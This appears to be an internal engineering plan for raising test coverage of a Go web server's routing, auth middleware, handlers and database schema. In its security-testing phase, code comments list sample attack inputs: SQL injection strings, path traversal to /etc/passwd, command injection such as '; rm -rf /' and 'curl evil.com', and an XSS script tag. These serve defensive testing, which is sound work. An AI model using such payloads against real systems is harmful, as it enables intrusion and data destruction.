# Plan 46: Test Coverage Overhaul

**Priority**: CRITICAL (Security > Reliability > Performance)
**Created**: 2026-02-07
**Status**: Approved (Execution Required)

## Problem Statement

Two production bugs escaped to production because tests didn't catch them:
1. `/api/cmd` routing bug (auth bypass misconfiguration)
2. `ResolveAlias` 'app' type bug (schema mismatch)

Deep audit reveals **31% overall coverage** with critical gaps in security-critical paths.

## Current State: Coverage by Priority

| Area | Coverage | Status | Risk |
|------|----------|--------|------|
| **Routing** | 1.4% | CRITICAL | 🔴 Highest |
| **Auth Middleware** | 11.9% | CRITICAL | 🔴 Highest |
| **Handlers** | 7.3% | CRITICAL | 🔴 High |
| **Database** | 4.4% | CRITICAL | 🔴 High |
| **Storage** | 16.5% | LOW | 🟡 Medium |
| **Auth Package** | 30.5% | PARTIAL | 🟡 Medium |
| **Hosting** | 47.2% | MODERATE | 🟢 Low |

## Root Causes

### 1. Routing Logic Untested
**File**: `cmd/server/main.go::createRootHandler()` (140+ lines, 0 tests)

- Host-based routing (admin.*, root.*, subdomains)
- Auth bypass whitelist (9 endpoints bypass AdminMiddleware)
- Middleware application order
- Local-only route protection

**Impact**: Caught us twice. Any routing change risks security breach.

### 2. Middleware Completely Untested
**File**: `internal/middleware/auth.go` (146 lines, 0 tests)

Functions with **ZERO coverage**:
- `AuthMiddleware()` - Core auth enforcement
- `AdminMiddleware()` - Role-based access control
- `requiresAuth()` - Path whitelist logic
- Bearer token validation (lines 26-39)
- Session validation (lines 42-51)

**Impact**: The single point that gates ALL authenticated routes is untested.

### 3. Schema Drift
**Issue**: Test DB schema ≠ Production schema

Test setup (handlers_test.go) missing tables:
- `apps`, `aliases`, `peers`, `auth_users`, `auth_sessions`
- `storage_keys`, `storage_objects`, `activity_log`
- `net_allowlist`, `net_secrets`, `net_log`, `workers`

**Impact**: Tests pass against incomplete schema, fail in production.

### 4. Handler Coverage Abysmal
**17 handlers with 0% coverage** (2,900+ untested lines):
- `deploy.go` (170 lines) - deployment security
- `auth_handlers.go` (462 lines) - login/session management
- `sql.go` (169 lines) - admin SQL execution (!!)
- `agent_handler.go` (474 lines) - agent management
- ... 13 more

**Impact**: Critical paths (deploy, auth, admin) have no test coverage.

## The Fix: 4-Phase Approach

### Phase 1: Block the Bleeding (CRITICAL - Week 1)

**Goal**: Test the paths that caught us + highest security risk

#### 1.1 Routing Tests (~8-10 hours)
**File**: `cmd/server/main_routing_test.go` (new)

Test matrix:
```
[Host: admin.*] × [Path: /api/*] × [Auth: none/session/apikey] × [Role: none/user/admin]
```

Tests required (~200 test cases):
- ✅ Host routing: admin.*, root.*, app.*, localhost
- ✅ Auth bypass whitelist (9 endpoints): /api/deploy, /api/cmd, etc.
- ✅ AdminMiddleware application: /api/apps, /api/aliases, etc.
- ✅ Local-only routes: /_app/<id>/
- ✅ Middleware order: auth before admin
- ✅ Path precedence: specific before wildcard

**Acceptance**:
- Routing config changes break tests
- Auth bypass changes break tests
- Middleware order changes break tests

#### 1.2 Middleware Tests (~4-6 hours)
**File**: `internal/middleware/auth_test.go` (expand)

Functions to test:
```go
TestAuthMiddleware()           // 10 cases: valid/invalid token, session, bypass
TestAdminMiddleware()          // 8 cases: user/admin role, missing role
TestRequiresAuth()             // 15 cases: all public paths, edge cases
TestBearerTokenParsing()       // 5 cases: format validation
TestSessionValidation()        // 8 cases: expiry, tampering
```

Edge cases:
- Empty Bearer header
- Malformed token ("Bearer" without space)
- Expired sessions
- Invalid session IDs
- Path traversal in requiresAuth() whitelist
- Case sensitivity in paths

**Acceptance**:
- Middleware bypass attempts fail tests
- Path whitelist changes break tests
- Role enforcement works correctly

#### 1.3 Schema Sync (~4-6 hours)
**File**: `internal/handlers/handlers_test.go`

Change approach:
```go
// OLD: Handwritten schema
schema := `CREATE TABLE ...`

// NEW: Use production migrations
func setupTestDB(t *testing.T) *sql.DB {
    db := createMemoryDB()
    // Run all migrations in order
    RunMigrations(db, "../../database/migrations")
    return db
}
```

Add tests:
- Schema equality test (prod vs test)
- Foreign key constraint validation
- Unique constraint validation
- DEFAULT value validation

**Acceptance**:
- Test DB === Production DB
- Migrations run cleanly in tests
- Schema changes trigger test updates

#### 1.4 Critical Handlers (~16-20 hours)
**Priority order** (by security + untested lines):

1. **auth_handlers.go** (462 lines) - LOGIN/SESSION
   - Test: Login rate limiting, password verification, session creation
   - Test: Invalid credentials, SQL injection attempts
   - Test: Session token validation, expiry handling

2. **deploy.go** (170 lines) - DEPLOYMENT
   - Test: API key validation, rate limiting (5/min)
   - Test: File upload size limits, path traversal
   - Test: ZIP bomb protection, malicious archives

3. **sql.go** (169 lines) - ADMIN SQL (!!)
   - Test: Admin-only access (non-admin rejected)
   - Test: SQL injection prevention (parameterized queries)
   - Test: Read-only enforcement (if applicable)

4. **agent_handler.go** (474 lines) - AGENT MANAGEMENT
   - Test: Agent authentication, authorization
   - Test: API key scoping, resource access control

**Acceptance**:
- Auth bypass attempts fail
- Injection attempts fail
- Access control enforced

### Phase 2: Systematic Handler Coverage (Weeks 2-3)

**Goal**: Test remaining 13 handlers (2,000+ lines)

#### Handler Test Template
```go
func TestHandlerName_HappyPath(t *testing.T)
func TestHandlerName_Unauthorized(t *testing.T)
func TestHandlerName_Forbidden(t *testing.T)
func TestHandlerName_InvalidInput(t *testing.T)
func TestHandlerName_NotFound(t *testing.T)
func TestHandlerName_ServerError(t *testing.T)
func TestHandlerName_EdgeCases(t *testing.T)
```

Priority order:
1. **system.go** (257 lines) - system info endpoints
2. **upgrade_handler.go** (312 lines) - server upgrades
3. **apps_handler.go** (892 lines) - app management
4. **track.go** (170 lines) - event tracking
5. **webhook.go** (134 lines) - webhook handling
6. **api.go** (469 lines) - stats/events API
7. 7 more handlers (smaller files)

**Effort**: ~40-50 hours total
**Output**: ~500-700 test cases

### Phase 3: Integration Tests (Week 4)

**Goal**: Test component interactions (gaps between unit tests)

#### 3.1 Auth Flow Integration
```go
TestLoginToAPIAccess()           // Login → Session → Middleware → Handler
TestAPIKeyToDeployment()         // API Key → Validation → Deploy
TestOAuthToSession()             // OAuth → Callback → Session Creation
TestSessionExpiry()              // Login → Wait → Expired → Rejected
TestRoleEscalation()             // User → Try Admin Endpoint → Rejected
```

#### 3.2 Routing Integration
```go
TestHostRoutingFlow()            // admin.* → auth → handler
TestSubdomainAppServing()        // app.domain.* → alias resolution → serving
TestLocalhostSpecialCase()       // localhost → auth middleware
TestAuthBypassEndpoints()        // /api/cmd with API key → success
```

#### 3.3 Data Flow Integration
```go
TestDeployToServing()            // Deploy → VFS → Serving
TestStorageAccessControl()       // User A → User B's data → Rejected
TestAliasToAppResolution()       // Alias → ResolveAlias → App serving
```

**Effort**: ~20-30 hours
**Output**: ~100-150 integration tests

### Phase 4: Security Hardening (Week 5)

**Goal**: Adversarial testing - try to break it

#### 4.1 Injection Tests
```go
TestSQLInjection_AllHandlers()   // ' OR 1=1 --, UNION SELECT, etc.
TestPathTraversal_FileOps()      // ../../etc/passwd, ..\..\..\
TestCommandInjection_System()    // ; rm -rf /, && curl evil.com
TestXSS_UserInput()              // <script>alert(1)</script>
```

#### 4.2 Auth Bypass Tests
```go
TestJWTBypass_InvalidSignature()
TestSessionFixation()
TestCSRF_StateMutations()
TestTokenReplay()
TestBruteForce_RateLimiting()
TestPrivilegeEscalation()
```

#### 4.3 Resource Exhaustion Tests
```go
TestZipBomb_Deploy()
TestOversizedUpload()
TestSlowloris_Streaming()
TestMemoryExhaustion_LargePayload()
TestRecursionDepth_JSONParsing()
```

#### 4.4 SSRF Tests (egress package)
```go
TestSSRF_PrivateIPBlocking()     // 127.0.0.1, 10.0.0.0/8, 192.168.0.0/16
TestSSRF_IPv6Bypass()            // ::1, IPv4-mapped IPv6
TestSSRF_RedirectChaining()      // public → 302 → private
TestSSRF_DNSRebinding()          // Time-of-check vs time-of-use
```

**Effort**: ~30-40 hours
**Output**: ~200-300 security tests

## Implementation Strategy

### Test Automation
```bash
# Run on every commit (CI)
go test ./... -short -count=1

# Run nightly (comprehensive)
go test ./... -race -count=5

# Run before release
go test ./... -race -count=10 -timeout 30m
```

### Coverage Tracking
```bash
# Generate coverage report
go test ./... -coverprofile=coverage.out
go tool cover -html=coverage.out -o coverage.html

# Enforce minimum coverage (ratchet approach)
# Start: 31% → Week 1: 50% → Week 2: 65% → Week 3: 75% → Week 4: 85%
```

### Test Organization
```
internal/
├── handlers/
│   ├── auth_handlers_test.go      (NEW - Phase 1.4)
│   ├── deploy_test.go              (NEW - Phase 1.4)
│   ├── sql_test.go                 (NEW - Phase 1.4)
│   ├── agent_handler_test.go       (NEW - Phase 1.4)
│   ├── system_test.go              (NEW - Phase 2)
│   └── ... (13 more)
├── middleware/
│   ├── auth_test.go                (EXPAND - Phase 1.2)
│   └── security_test.go            (EXPAND - Phase 4)
cmd/server/
    ├── main_routing_test.go        (NEW - Phase 1.1)
    └── main_integration_test.go    (NEW - Phase 3)
```

## Success Metrics

### Coverage Targets

| Phase | Target | Critical Areas |
|-------|--------|----------------|
| Phase 1 (Week 1) | 50% | Routing, Middleware, Schema, 4 handlers |
| Phase 2 (Week 2-3) | 65% | All handlers |
| Phase 3 (Week 4) | 75% | Integration tests |
| Phase 4 (Week 5) | 85% | Security hardening |

### Quality Metrics
- **Zero routing bugs**: Routing config changes break tests
- **Zero auth bypasses**: All protected routes reject unauthenticated
- **Zero schema drift**: Test DB === Production DB
- **Zero injection**: SQLi/XSS/SSRF attempts fail

## Non-Goals (Out of Scope)

- Performance testing (later)
- Load testing (later)
- UI testing (admin frontend - separate plan)
- End-to-end browser testing (later)
- Fuzzing (Phase 5, future)

## Risks & Mitigation

### Risk 1: Time Investment
**Risk**: 100-150 hours of test writing
**Mitigation**: Prioritize by security impact (Phase 1 first)
**Trade-off**: Accept slower feature velocity for reliability

### Risk 2: False Confidence
**Risk**: High coverage ≠ good tests
**Mitigation**:
- Focus on edge cases, not happy paths
- Include adversarial testing (Phase 4)
- Code review all tests for quality

### Risk 3: Test Maintenance
**Risk**: Tests become brittle, slow down development
**Mitigation**:
- Use test helpers/utilities (testutil package)
- Clear test names describe what's being tested
- Integration tests separate from unit tests

### Risk 4: Production Breakage During Refactor
**Risk**: Adding tests might find existing bugs
**Mitigation**:
- Fix bugs as found (don't defer)
- Test current behavior first, then fix
- Deploy fixes incrementally

## Decision Points

### Decision 1: Schema Testing Approach
**Options**:
A. Handwritten test schema (current)
B. Use production migrations in tests ✅
C. Generate test schema from production

**Choice**: B - Use migrations
**Rationale**: Guarantees test === production

### Decision 2: Integration Test Strategy
**Options**:
A. Mock external dependencies
B. In-memory test services ✅
C. Docker compose test environment

**Choice**: B - In-memory (SQLite, no external services)
**Rationale**: Fast, deterministic, CI-friendly

### Decision 3: Coverage Enforcement
**Options**:
A. Block PRs below threshold
B. Warn on coverage decrease ✅
C. No enforcement

**Choice**: B - Warn
**Rationale**: Incremental improvement without blocking urgent fixes

## Execution Plan

### Week 1 (Phase 1) - CRITICAL
- [ ] Day 1-2: Routing tests (main_routing_test.go)
- [ ] Day 3: Middleware tests (auth_test.go)
- [ ] Day 4: Schema sync (handlers_test.go)
- [ ] Day 5: auth_handlers_test.go + deploy_test.go

### Week 2-3 (Phase 2) - SYSTEMATIC
- [ ] Week 2: 7 handlers (sql, agent, system, upgrade, apps, track, webhook)
- [ ] Week 3: 6 remaining handlers

### Week 4 (Phase 3) - INTEGRATION
- [ ] Day 1-2: Auth flow integration
- [ ] Day 3: Routing integration
- [ ] Day 4-5: Data flow integration

### Week 5 (Phase 4) - SECURITY
- [ ] Day 1: Injection tests
- [ ] Day 2: Auth bypass tests
- [ ] Day 3: Resource exhaustion
- [ ] Day 4: SSRF tests
- [ ] Day 5: Review & documentation

## Deliverables

### Code
- ~1,000-1,500 new test cases
- Test coverage: 31% → 85%
- Test code: ~10,000-15,000 lines

### Documentation
- Test strategy document
- Security test checklist
- CI/CD test pipeline

### Process
- Pre-commit test hook
- Coverage ratcheting
- Test review guidelines

## Open Questions

1. Should we add property-based testing (fuzzing) in Phase 5?
2. Should middleware tests use real DB or mocks?
3. How do we test OAuth without external providers? (Mock provider)
4. Should we add mutation testing to verify test quality?

## Approval

This plan represents ~150 hours of work over 5 weeks. Given the security criticality (2 production bugs), this investment is justified.

**Priority**: Security > Reliability > Performance > Features

---

**Status**: Ready for execution
**Owner**: Implementation required
**Timeline**: 5 weeks (flexible based on bug severity)
